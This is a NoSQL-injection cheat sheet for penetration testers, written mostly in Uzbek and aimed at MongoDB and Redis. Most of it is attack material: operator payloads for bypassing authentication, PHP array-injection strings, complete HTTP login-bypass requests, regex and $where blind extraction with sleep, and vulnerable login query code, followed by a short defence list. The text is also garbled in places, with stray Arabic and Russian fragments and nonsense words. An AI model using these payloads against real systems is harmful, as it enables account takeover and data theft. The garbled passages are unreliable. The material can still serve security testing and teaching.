# NoSQL Injection

## 1. Ta'rif
NoSQL injection — MongoDB/Redis/Dynamo/Cassandra kabi NoSQL query'lariga JS-obekt operatory (`$ne`, `$gt`, `$where`) yoki operator array'lar ini kiritish → auth bypass, data dump. JSON bem بعد data ko'p.

## 2. Qayerdan kelib chiqadi
- Endpoints JSON bilan: `{"user": name, "pass": pass}`
- Foydalanuvchi kiritgan value DB query'ga tushadi: `db.users.findOne({user: input.user, pass: input.pass})`
- PHP `MongoDB\BSON` print_r as strings
- `$where`, `$expr`, `$regex`, `$gt`, `$ne` qatnashsa

## 3. Turlari
| Tur | Misol |
|-----|-------|
| Operator injection (JSON) | `{"$ne": null}` |
| Query selector | fine — `$eq/$gt/$regex` |
| JS/`$where` injection | `$where: "this.pass==..."` |
| Blind (regex-based) | `$regex: "^a"` bruteforce |
| Aggregations | `$group`, `$lookup` bo'lsa |

## 4. Metodologiya
1. JSON API — login/search/list filter с параметр объект.
2. Operatorlar: `{"$ne": null}` / `{"$gt": ""}` — auth bypass test:
   ```
   {"username": {"$ne": "zzz"}, "password": {"$ne": "zzz"}}
   ```
3. Login: 200/redirect → first user sans pass.
4. Regex blind: `{"user": {"$regex": "^admin"}}`, char brute.
5. `$in`, `$regex`, `$where` — MongoDB JS: `$where: "this.password.length == 8"` (time bool).
6. PHP: `username[$ne]=x&password[$ne]=x` (array injection via query string!).
7. Data dump: `?field[$regex]=.*` endpointlarda.
8. Redis `AUTH` — `EVAL`, `Redis` protocol gopher.

## 5. Payload'lar
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": "^.*$"}, "password": {"$regex": "^.*$"}}
{"username": {"$in": ["admin", "root"]}}
{"user": {"$where": "this.password == 'secret'"}}
{"user": {"$gt": "", "$where": "sleep(5000)"}}
{"check": {"$exists": true}}

# URL-encoded form (PHP/Express)
username[$ne]=1&password[$ne]=1
user[$regex]=^admin&pass[$ne]=1
```
## 6. Request misollari
```
POST /login HTTP/1.1
Content-Type: application/json

{"username": {"$ne": null}, "password": {"$ne": null}}

GET /api/search?name[$regex]=^a&name[$options]=i HTTP/1.1

POST /v2/auth HTTP/1.1
Content-Type: application/x-www-form-urlencoded
username[$gt]=&password[$gt]=
```
## 7. Zaif code misollari
```javascript
// Node/Mongoose — ZAIF
db.users.findOne({ username: req.body.username, password: req.body.password })
// {"username":{"$ne":null}...} → operator serverga o'tadi

// Python pymongo — ZAIF
users.find_one({"user": data["user"], "pass": data["pass"]})

// XAVFSIZ: sanat — operator ishlatilmaydigan helte
// - {username: {$eq: String(req.body.username)}}
// - bcrypt hash compare, never raw query objects
```
## 8. Nimalarga ahamiyat berish (checklist)
- [ ] JSON operatorlar: `$ne $gt $regex $where $in $exists $expr`
- [ ] Array injection (PHP form): `username[$ne]=x`
- [ ] Brauzer form uchun `%24ne` → `$ne`
- [ ] Regex chiqarish — boolean/time blind char-by-char
- [ ] `$where` JS sleep — DoS ham anatol
- [ ] Mongo aggregation pipeline bo'lsa
- [ ] MongoID predict? (unix timestamp)
- [ ] Redis gopher / Docker API kombos
## 9. Himoya
- Sanitize/whitelist input keys — forbid `$`/operators
- Use typed query params, parameterized cds
- Decode before validation, `Object` coercion`ga esan -2
- Schemalaruz that rejects `$` keys